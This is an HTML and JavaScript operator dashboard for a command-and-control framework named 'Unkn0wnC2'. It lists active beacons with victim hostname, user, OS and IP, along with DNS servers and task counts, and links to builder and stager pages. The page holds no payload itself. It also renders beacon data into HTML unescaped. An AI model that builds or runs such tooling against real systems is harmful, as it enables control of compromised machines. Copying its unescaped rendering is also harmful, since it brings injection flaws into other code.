<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard - Unkn0wnC2</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=ITC+Benguiat:wght@400;700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0f0f0f;
            color: #e0e0e0;
        }

        .navbar {
            background: rgba(20, 20, 20, 0.95);
            border-bottom: 1px solid #333;
            padding: 15px 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            position: sticky;
            top: 0;
            z-index: 1000;
        }

        .navbar-brand {
            font-size: 32px;
            font-weight: 700;
            color: #ff3333;
            text-shadow: 0 0 10px rgba(255, 51, 51, 0.5);
            font-family: 'Bebas Neue', 'Impact', sans-serif;
            letter-spacing: 4px;
        }

        .navbar-right {
            display: flex;
            gap: 20px;
            align-items: center;
        }

        .user-info {
            color: #aaa;
            font-size: 14px;
        }

        .btn-logout {
            padding: 8px 20px;
            background: rgba(255, 50, 50, 0.2);
            border: 1px solid rgba(255, 50, 50, 0.3);
            border-radius: 6px;
            color: #ff5555;
            cursor: pointer;
            font-size: 14px;
            transition: all 0.3s ease;
        }

        .btn-logout:hover {
            background: rgba(255, 50, 50, 0.3);
            transform: translateY(-2px);
        }

        .nav-menu {
            background: rgba(25, 25, 25, 0.95);
            border-bottom: 1px solid #333;
            padding: 12px 30px;
            display: flex;
            gap: 15px;
            position: sticky;
            top: 61px;
            z-index: 999;
        }

        .nav-btn {
            padding: 10px 24px;
            background: rgba(255, 50, 50, 0.1);
            border: 1px solid rgba(255, 50, 50, 0.3);
            border-radius: 6px;
            color: #e0e0e0;
            cursor: pointer;
            font-size: 14px;
            font-weight: 500;
            transition: all 0.3s ease;
            text-decoration: none;
            display: inline-block;
        }

        .nav-btn:hover {
            background: rgba(255, 50, 50, 0.2);
            border-color: rgba(255, 50, 50, 0.5);
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(255, 50, 50, 0.2);
        }

        .nav-btn.active {
            background: rgba(255, 50, 50, 0.3);
            border-color: #ff3333;
            color: #ff3333;
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 30px;
        }

        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }

        .stat-card {
            background: rgba(20, 20, 20, 0.95);
            border: 1px solid #333;
            border-radius: 12px;
            padding: 25px;
            transition: all 0.3s ease;
        }

        .stat-card:hover {
            transform: translateY(-5px);
            border-color: #ff3333;
            box-shadow: 0 8px 24px rgba(255, 51, 51, 0.2);
        }

        .stat-card .label {
            color: #888;
            font-size: 14px;
            margin-bottom: 10px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .stat-card .value {
            font-size: 36px;
            font-weight: 700;
            color: #ff3333;
            margin-bottom: 5px;
        }

        .stat-card .subtitle {
            color: #666;
            font-size: 13px;
        }

        .section {
            background: rgba(20, 20, 20, 0.95);
            border: 1px solid #333;
            border-radius: 12px;
            padding: 25px;
            margin-bottom: 30px;
        }

        .section-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            padding-bottom: 15px;
            border-bottom: 1px solid #333;
        }

        .section-title {
            font-size: 24px;
            font-weight: 600;
            color: #ff3333;
            font-family: 'Bebas Neue', 'Arial Narrow', sans-serif;
            letter-spacing: 2px;
        }

        .table {
            width: 100%;
            border-collapse: collapse;
        }

        .table thead {
            background: rgba(255, 51, 51, 0.1);
        }

        .table th {
            padding: 12px;
            text-align: left;
            font-size: 13px;
            color: #ff3333;
            text-transform: uppercase;
            letter-spacing: 1px;
            font-weight: 600;
        }

        .table td {
            padding: 15px 12px;
            border-top: 1px solid #2a2a2a;
            font-size: 14px;
        }

        .table tbody tr {
            transition: all 0.2s ease;
        }

        .table tbody tr:hover {
            background: rgba(255, 51, 51, 0.05);
        }

        .status-badge {
            padding: 4px 12px;
            border-radius: 12px;
            font-size: 12px;
            font-weight: 600;
            text-transform: uppercase;
        }

        .status-online {
            background: rgba(0, 255, 136, 0.2);
            color: #00ff88;
        }

        .status-offline {
            background: rgba(255, 50, 50, 0.2);
            color: #ff5555;
        }

        .empty-state {
            text-align: center;
            padding: 60px 20px;
            color: #666;
        }

        .empty-state-icon {
            font-size: 48px;
            margin-bottom: 15px;
            opacity: 0.3;
        }

        .btn-refresh {
            padding: 8px 16px;
            background: rgba(255, 51, 51, 0.1);
            border: 1px solid rgba(255, 51, 51, 0.3);
            border-radius: 6px;
            color: #ff3333;
            cursor: pointer;
            font-size: 13px;
            transition: all 0.3s ease;
        }

        .btn-refresh:hover {
            background: rgba(255, 51, 51, 0.2);
        }

        .btn-manage {
            padding: 6px 12px;
            background: rgba(255, 51, 51, 0.1);
            border: 1px solid rgba(255, 51, 51, 0.3);
            border-radius: 4px;
            color: #ff3333;
            cursor: pointer;
            font-size: 12px;
            transition: all 0.3s ease;
        }

        .btn-manage:hover {
            background: rgba(255, 51, 51, 0.2);
            border-color: rgba(255, 51, 51, 0.5);
        }

        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.8);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 9999;
        }

        .loading-overlay.show {
            display: flex;
        }

        .spinner {
            width: 50px;
            height: 50px;
            border: 4px solid #333;
            border-top-color: #ff3333;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="loading-overlay" id="loadingOverlay">
        <div class="spinner"></div>
    </div>

    <nav class="navbar">
        <div class="navbar-brand">Unkn0wnC2</div>
        <div class="navbar-right">
            <div class="user-info">Logged in as <strong id="username">admin</strong></div>
            <button class="btn-logout" onclick="logout()">Logout</button>
        </div>
    </nav>

    <!-- Navigation Menu -->
    <div class="nav-menu">
        <a href="/dashboard" class="nav-btn active">Dashboard</a>
        <a href="/builder" class="nav-btn">Builder</a>
        <a href="/stager" class="nav-btn">Stager Sessions</a>
        <a href="/users" class="nav-btn" id="usersNavBtn">Users</a>
    </div>

    <div class="container">
        <!-- Statistics -->
        <div class="stats-grid">
            <div class="stat-card">
                <div class="label">Active Beacons</div>
                <div class="value" id="beaconCount">0</div>
                <div class="subtitle">Connected clients</div>
            </div>
            <div class="stat-card">
                <div class="label">DNS-Servers</div>
                <div class="value" id="serverCount">0</div>
                <div class="subtitle">DNS servers</div>
            </div>
            <div class="stat-card">
                <div class="label">Pending Tasks</div>
                <div class="value" id="taskCount">0</div>
                <div class="subtitle">Queued commands</div>
            </div>
            <div class="stat-card">
                <div class="label">Total Results</div>
                <div class="value" id="resultCount">0</div>
                <div class="subtitle">Completed tasks</div>
            </div>
        </div>

        <!-- Beacons Table -->
        <div class="section">
            <div class="section-header">
                <h2 class="section-title">Active Beacons</h2>
                <button class="btn-refresh" onclick="loadBeacons()">‚Üª Refresh</button>
            </div>
            <div id="beaconsTable">
                <div class="empty-state">
                    <div class="empty-state-icon">üì°</div>
                    <div>No active beacons</div>
                </div>
            </div>
        </div>

        <!-- DNS Servers Table -->
        <div class="section">
            <div class="section-header">
                <h2 class="section-title">DNS-Servers</h2>
                <button class="btn-refresh" onclick="loadServers()">‚Üª Refresh</button>
            </div>
            <div id="serversTable">
                <div class="empty-state">
                    <div class="empty-state-icon">üñ•Ô∏è</div>
                    <div>No DNS-servers registered</div>
                </div>
            </div>
        </div>
    </div>

    <script>
        const API_BASE = '';

        // Helper to get CSRF token from cookie
        function getCookie(name) {
            const value = `; ${document.cookie}`;
            const parts = value.split(`; ${name}=`);
            if (parts.length === 2) return parts.pop().split(';').shift();
            return null;
        }

        // Fetch with authentication (cookie-based) and CSRF protection
        async function authFetch(url, options = {}) {
            const headers = {
                'Content-Type': 'application/json',
                ...options.headers
            };

            // Add CSRF token for state-changing requests
            if (options.method && options.method !== 'GET') {
                const csrfToken = getCookie('csrf_token');
                if (csrfToken) {
                    headers['X-CSRF-Token'] = csrfToken;
                }
            }

            const response = await fetch(url, { 
                ...options, 
                headers,
                credentials: 'include' // Include cookies
            });

            if (response.status === 401 || response.status === 403) {
                window.location.href = '/login';
                return null;
            }

            return response;
        }

        // Check authentication on page load
        async function checkAuth() {
            try {
                const response = await authFetch('/api/stats');
                if (!response || !response.ok) {
                    window.location.href = '/login';
                }
            } catch (error) {
                window.location.href = '/login';
            }
        }
        checkAuth();

        // Load dashboard data
        async function loadDashboard() {
            document.getElementById('loadingOverlay').classList.add('show');
            
            try {
                await Promise.all([
                    loadBeacons(),
                    loadServers(),
                    loadStats()
                ]);
            } catch (error) {
                console.error('Error loading dashboard:', error);
            } finally {
                document.getElementById('loadingOverlay').classList.remove('show');
            }
        }

        // Load beacons
        async function loadBeacons() {
            try {
                const response = await authFetch('/api/beacons');
                if (!response) return;

                const data = await response.json();
                const beacons = data.beacons || [];

                document.getElementById('beaconCount').textContent = beacons.length;

                if (beacons.length === 0) {
                    document.getElementById('beaconsTable').innerHTML = `
                        <div class="empty-state">
                            <div class="empty-state-icon">üì°</div>
                            <div>No active beacons</div>
                        </div>`;
                    return;
                }

                const table = `
                    <table class="table">
                        <thead>
                            <tr>
                                <th>ID</th>
                                <th>Hostname</th>
                                <th>User</th>
                                <th>OS</th>
                                <th>IP Address</th>
                                <th>Last Seen</th>
                                <th>Status</th>
                                <th>Actions</th>
                            </tr>
                        </thead>
                        <tbody>
                            ${beacons.map(beacon => `
                                <tr>
                                    <td><code>${beacon.id}</code></td>
                                    <td>${beacon.hostname}</td>
                                    <td>${beacon.username}</td>
                                    <td>${beacon.os}</td>
                                    <td>${beacon.ip_address}</td>
                                    <td>${formatTimestamp(beacon.last_seen)}</td>
                                    <td><span class="status-badge ${isOnline(beacon.last_seen) ? 'status-online' : 'status-offline'}">${isOnline(beacon.last_seen) ? 'Online' : 'Offline'}</span></td>
                                    <td><button class="btn-manage" onclick="manageBeacon('${beacon.id}', '${beacon.hostname}')">Manage</button></td>
                                </tr>
                            `).join('')}
                        </tbody>
                    </table>`;
                
                document.getElementById('beaconsTable').innerHTML = table;
            } catch (error) {
                console.error('Error loading beacons:', error);
            }
        }

        // Load DNS servers
        async function loadServers() {
            try {
                const response = await authFetch('/api/dns-servers');
                if (!response) return;

                const data = await response.json();
                const servers = data.servers || [];

                document.getElementById('serverCount').textContent = servers.length;

                if (servers.length === 0) {
                    document.getElementById('serversTable').innerHTML = `
                        <div class="empty-state">
                            <div class="empty-state-icon">üñ•Ô∏è</div>
                            <div>No DNS servers registered</div>
                        </div>`;
                    return;
                }

                const table = `
                    <table class="table">
                        <thead>
                            <tr>
                                <th>ID</th>
                                <th>Domain</th>
                                <th>Address</th>
                                <th>Last Checkin</th>
                                <th>Status</th>
                            </tr>
                        </thead>
                        <tbody>
                            ${servers.map(server => `
                                <tr>
                                    <td><code>${server.id}</code></td>
                                    <td>${server.domain || 'N/A'}</td>
                                    <td>${server.address || 'N/A'}</td>
                                    <td>${formatTimestamp(server.last_checkin)}</td>
                                    <td><span class="status-badge ${isOnline(server.last_checkin) ? 'status-online' : 'status-offline'}">${isOnline(server.last_checkin) ? 'Online' : 'Offline'}</span></td>
                                </tr>
                            `).join('')}
                        </tbody>
                    </table>`;
                
                document.getElementById('serversTable').innerHTML = table;
            } catch (error) {
                console.error('Error loading servers:', error);
            }
        }

        // Load statistics
        async function loadStats() {
            try {
                const response = await authFetch('/api/stats');
                if (!response) return;
                
                const stats = await response.json();
                
                // Update task counts
                document.getElementById('taskCount').textContent = stats.tasks || '0';
                
                // Calculate result count (completed tasks)
                const tasksByStatus = stats.tasks_by_status || {};
                const completedTasks = tasksByStatus['completed'] || 0;
                document.getElementById('resultCount').textContent = completedTasks;
                
                // Log task status breakdown for operators to see in browser console
                if (tasksByStatus && Object.keys(tasksByStatus).length > 0) {
                    console.log('üìä Task Status Breakdown:', tasksByStatus);
                }
            } catch (error) {
                console.error('Error loading stats:', error);
                document.getElementById('taskCount').textContent = 'N/A';
                document.getElementById('resultCount').textContent = 'N/A';
            }
        }

        // Helper functions
        function formatTimestamp(timestamp) {
            if (!timestamp) return 'Never';
            const date = new Date(timestamp);
            const now = new Date();
            const diff = Math.floor((now - date) / 1000);

            if (diff < 60) return `${diff}s ago`;
            if (diff < 3600) return `${Math.floor(diff / 60)}m ago`;
            if (diff < 86400) return `${Math.floor(diff / 3600)}h ago`;
            return date.toLocaleDateString() + ' ' + date.toLocaleTimeString();
        }

        function isOnline(timestamp) {
            if (!timestamp) return false;
            const date = new Date(timestamp);
            const now = new Date();
            const diff = Math.floor((now - date) / 1000);
            return diff < 300; // Online if seen within 5 minutes
        }

        async function logout() {
            try {
                // Call logout endpoint to revoke session and clear cookies
                await authFetch('/api/auth/logout', { method: 'POST' });
            } catch (error) {
                console.error('Logout error:', error);
            }
            // Redirect to login regardless of API response
            window.location.href = '/login';
        }

        function manageBeacon(beaconId, hostname) {
            // Navigate to beacon management page
            window.location.href = `/beacon?id=${beaconId}&hostname=${encodeURIComponent(hostname)}`;
        }

        // Initial load
        loadDashboard();

        // Auto-refresh every 10 seconds
        setInterval(() => {
            loadBeacons();
            loadServers();
            loadStats();
        }, 10000);
    </script>
</body>
</html>
